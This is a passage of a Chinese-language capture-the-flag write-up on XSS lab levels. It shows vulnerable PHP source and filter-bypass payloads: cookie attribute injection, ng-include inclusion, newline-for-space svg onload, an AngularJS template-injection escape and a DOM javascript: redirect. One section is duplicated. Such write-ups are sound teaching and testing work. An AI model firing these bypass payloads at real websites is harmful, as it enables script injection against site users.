+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>&lt;form id=search&gt;
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>&lt;input name="t_link"  value="'.'" type="hidden"&gt;
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>&lt;input name="t_history"  value="'.'" type="hidden"&gt;
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>&lt;input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden"&gt;
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>&lt;input name="t_ua"  value="'.$str33.'" type="hidden"&gt;
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>&lt;/form&gt;
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>&lt;/center&gt;';
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>?&gt;
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>&lt;?php 
+<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str)."&lt;/h3&gt;";
+<a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>?&gt;
+<a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a>&lt;/body&gt;
+<a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-12.md -->
+<h3 id="cookie-xss">Cookie XSS<a class="headerlink" href="#cookie-xss" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第十三关</strong></p>
+<p>查看源代码发现这次值是 <code>t_cook</code>，猜测为 <code>cookie</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6814741a58cb8da5c8d68b00.png"></p>
+<p>更改 <code>cookie</code> 为上一关的 payload，然后刷新网页就能看到框了</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>" onclick=javascript:alert() type="text
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681474b258cb8da5c8d68b23.png"></p>
+<p>成功弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681474f158cb8da5c8d68b3c.png"></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&lt;head&gt;
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>&lt;script&gt;
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>window.alert = function()  
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>{     
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>confirm("完成的不错！");
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a> window.location.href="level14.php"; 
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>}
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>&lt;/script&gt;
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>&lt;title&gt;欢迎来到level13&lt;/title&gt;
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>&lt;/head&gt;
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>&lt;body&gt;
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>&lt;?php 
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>setcookie("user", "call me maybe?", time()+3600);
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>ini_set("display_errors", 0);
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>$str = $_GET["keyword"];
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>$str00 = $_GET["t_sort"];
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>$str11=$_COOKIE["user"];
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>$str22=str_replace("&gt;","",$str11);
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>$str33=str_replace("&lt;","",$str22);
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>&lt;form id=search&gt;
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>&lt;input name="t_link"  value="'.'" type="hidden"&gt;
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>&lt;input name="t_history"  value="'.'" type="hidden"&gt;
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>&lt;input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden"&gt;
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>&lt;input name="t_cook"  value="'.$str33.'" type="hidden"&gt;
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>&lt;/form&gt;
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>&lt;/center&gt;';
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>?&gt;
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>&lt;?php 
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str)."&lt;/h3&gt;";
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>?&gt;
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>&lt;/body&gt;
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-13.md -->
+<h3 id="angular-js-ng-include-xss">Angular JS ng-include XSS<a class="headerlink" href="#angular-js-ng-include-xss" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第十五关</strong></p>
+<p>看到这一关的参数是文件名</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6814763858cb8da5c8d68bc0.png"></p>
+<p>查看源代码发现有 <code>ng-include</code> 指令引入了图片</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68147b4d58cb8da5c8d6a511.png"></p>
+<p>尝试换为第一关的文件没有显示</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68147f6258cb8da5c8d6b672.png"></p>
+<p>加上单引号后就有了</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68147fa658cb8da5c8d6b680.png"></p>
+<p>所以我们可以利用第一关的漏洞，引入后直接传参</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>?src='/level1.php?name=<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>'
+</code></pre></div>
+<p>发现有做过滤</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6814803758cb8da5c8d6b69b.png"></p>
+<p>采用标签绕过</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>?src='level1.php?name=&lt;img src=abc onerror=alert(1)&gt;'
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6814836b58cb8da5c8d6b761.png"></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&lt;html ng-app&gt;
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>&lt;head&gt;
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>        &lt;meta charset="utf-8"&gt;
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>        &lt;script src="angular.min.js"&gt;&lt;/script&gt;
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>&lt;script&gt;
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>window.alert = function()  
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>{     
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>confirm("完成的不错！");
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a> window.location.href="level16.php?keyword=test"; 
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>}
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>&lt;/script&gt;
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>&lt;title&gt;欢迎来到level15&lt;/title&gt;
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>&lt;/head&gt;
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>&lt;?php 
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>ini_set("display_errors", 0);
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>$str = $_GET["src"];
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>echo '&lt;body&gt;&lt;span class="ng-include:'.htmlspecialchars($str).'"&gt;&lt;/span&gt;&lt;/body&gt;';
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>?&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-14.md -->
+<h3 id="_4">回车代替空格绕过<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第十六关</strong></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>&lt;head&gt;
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>&lt;script&gt;
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>window.alert = function()  
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>{     
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>confirm("完成的不错！");
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a> window.location.href="level17.php?arg01=a&amp;arg02=b"; 
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>}
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>&lt;/script&gt;
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>&lt;title&gt;欢迎来到level16&lt;/title&gt;
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>&lt;/head&gt;
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>&lt;body&gt;
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>&lt;?php 
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>$str = strtolower($_GET["keyword"]);
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>$str2=str_replace("script","&amp;nbsp;",$str);
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>$str3=str_replace(" ","&amp;nbsp;",$str2);
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>$str4=str_replace("/","&amp;nbsp;",$str3);
+<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>$str5=str_replace(" ","&amp;nbsp;",$str4);
+<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>echo "&lt;center&gt;".$str5."&lt;/center&gt;";
+<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>?&gt;
+<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
+<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>&lt;?php 
+<a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str5)."&lt;/h3&gt;";
+<a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>?&gt;
+<a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>&lt;/body&gt;
+<a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>&lt;/html&gt;
+</code></pre></div>
+<p>空格被实体化了，采用回车代替，URL 编码是 <code>%0A</code></p>
+<p><code>/</code> 被过滤了，采用短标签绕过</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>?keyword=<span class="p">&lt;</span><span class="nt">svg</span><span class="err">%</span><span class="na">0Aonload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681486ca58cb8da5c8d6bc81.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-15.md -->
+<h3 id="_5">短标签绕过<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第十六关</strong></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>&lt;head&gt;
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>&lt;script&gt;
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>window.alert = function()  
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>{     
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>confirm("完成的不错！");
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a> window.location.href="level17.php?arg01=a&amp;arg02=b"; 
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>}
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>&lt;/script&gt;
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>&lt;title&gt;欢迎来到level16&lt;/title&gt;
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>&lt;/head&gt;
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>&lt;body&gt;
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
+<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>&lt;?php 
+<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>$str = strtolower($_GET["keyword"]);
+<a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a>$str2=str_replace("script","&amp;nbsp;",$str);
+<a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a>$str3=str_replace(" ","&amp;nbsp;",$str2);
+<a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a>$str4=str_replace("/","&amp;nbsp;",$str3);
+<a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a>$str5=str_replace(" ","&amp;nbsp;",$str4);
+<a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a>echo "&lt;center&gt;".$str5."&lt;/center&gt;";
+<a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a>?&gt;
+<a id="__codelineno-11-24" name="__codelineno-11-24" href="#__codelineno-11-24"></a>&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
+<a id="__codelineno-11-25" name="__codelineno-11-25" href="#__codelineno-11-25"></a>&lt;?php 
+<a id="__codelineno-11-26" name="__codelineno-11-26" href="#__codelineno-11-26"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str5)."&lt;/h3&gt;";
+<a id="__codelineno-11-27" name="__codelineno-11-27" href="#__codelineno-11-27"></a>?&gt;
+<a id="__codelineno-11-28" name="__codelineno-11-28" href="#__codelineno-11-28"></a>&lt;/body&gt;
+<a id="__codelineno-11-29" name="__codelineno-11-29" href="#__codelineno-11-29"></a>&lt;/html&gt;
+</code></pre></div>
+<p>空格被实体化了，采用回车代替，URL 编码是 <code>%0A</code></p>
+<p><code>/</code> 被过滤了，采用短标签绕过</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>?keyword=<span class="p">&lt;</span><span class="nt">svg</span><span class="err">%</span><span class="na">0Aonload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681486ca58cb8da5c8d6bc81.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-16.md -->
+<h3 id="angular-js-xss">Angular JS 模板注入 XSS<a class="headerlink" href="#angular-js-xss" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68184d6958cb8da5c8dcab87.png"></p>
+<p><strong>第六关</strong></p>
+<p>测试发现存在模板注入漏洞</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68184d8d58cb8da5c8dcab96.png"></p>
+<p>构造 payload，<a href="https://juejin.cn/post/6891628594725847047#heading-4">参考文章</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+</code></pre></div>
+<p><code>'a'.constructor.prototype.charAt=[].join</code></p>
+<ul>
+<li><code>'a'.constructor</code> 获取字符串的构造函数（String）</li>
+<li><code>prototype.charAt</code> 访问 String 原型上的 charAt 方法</li>
+<li>将 charAt 方法替换为数组的 join 方法</li>
+</ul>
+<p><code>$eval('x=1} } };alert(1)//')</code></p>
+<ul>
+<li><code>$eval</code> 是 AngularJS 的一个方法，用于执行字符串形式的表达式</li>
+<li>注入的代码 <code>x=1} } };alert(1)//</code> 包含：</li>
+<li><code>x=1</code> - 一个简单的赋值，部分目的是为了闭合前面的语法</li>
+<li><code>} } }</code> - 多个闭合括号，用于逃逸 AngularJS 的模板解析</li>
+<li><code>;alert(1)</code> - 实际要执行的恶意代码</li>
+<li><code>//</code> - JavaScript 注释，用于注释掉后续可能存在的代码</li>
+</ul>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-17.md -->
+<h3 id="dom-xss">DOM 跳转 XSS<a class="headerlink" href="#dom-xss" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687c5c7358cb8da5c8c80176.png"></p>
+<p>进入网站直接看源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">        </span><span class="c1">// location.search：获取 URL 中 ? 后面的部分</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">        </span><span class="c1">// .split("=")：将字符串按照等号 = 分割成数组</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">        </span><span class="c1">// 如果 location.search 为 "?jumpto=https://www.baidu.com"，target 会是：</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">        </span><span class="c1">// ["?jumpto", "https://www.baidu.com"]</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">"="</span><span class="p">)</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">        </span><span class="c1">// target[0] 是 "?jumpto"</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="w">        </span><span class="c1">// .slice(1) 移除第一个字符 ?，变成 "jumpto"</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">        </span><span class="c1">// 如果等于 "jumpto"，就进入 if 块</span>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">target</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">slice</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"jumpto"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="w">            </span><span class="c1">// 将浏览器重定向到 target[1]，也就是 https://www.baidu.com</span>
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">            </span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">target</span><span class="p">[</span><span class="mf">1</span><span class="p">];</span>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w">        </span><span class="p">}</span>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>注意！当你将类似于  location.href = "javascript:alert('xss')"<code>这样的代码赋值给</code>location.href`  时</p>
+<p>浏览器会将其解释为一种特殊的 URL 方案，即 <code>"javascript:"</code></p>
+<p>在这种情况下，浏览器会将后面的 JavaScript 代码作为 URL 的一部分进行解析，然后执行它</p>
+<p>所以我们可以构造如下链接：执行 JS 语句</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>http://challenge-f42fd52528263d24.sandbox.ctfhub.com:10800/?jumpto=javascript:alert(1)
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687c722358cb8da5c8c82382.png"></p>
+<p>用 <code>jQuery</code>  的  <code>$.getScript()</code>  函数来异步加载并执行平台的 JS 脚本，通过 <code>jumpto=javascript:$.getScript()</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687c7e9258cb8da5c8c83e5d.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-18.md -->
+<h3 id="_6">/ 代替空格绕过<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687c79dd58cb8da5c8c836a9.png"></p>
+<p>利用 <code>/</code> 代替空格绕过</p>
+<p>​   <img alt="" src="https://pic1.imgdb.cn/item/687c7a0c58cb8da5c8c836f7.png"></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687c7a3158cb8da5c8c83781.png"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-2.md -->
+<h3 id="url-xss">URL XSS<a class="headerlink" href="#url-xss" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第一关</strong></p>
+<p>可以发现 <code>name</code> 参数渲染到了网页上</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e7958cb8da5c8d635e6.png"></p>
+<p>尝试传入恶意代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>?name=<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137f1b58cb8da5c8d63641.png"></p>
+<p>看一下源码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>&lt;head&gt;
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>&lt;script&gt;
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>window.alert = function()  
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>{     
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>confirm("完成的不错！");
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a> window.location.href="level2.php?keyword=test"; 
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>}
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>&lt;/script&gt;
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>&lt;title&gt;欢迎来到level1&lt;/title&gt;
+<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>&lt;/head&gt;
+<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>&lt;body&gt;
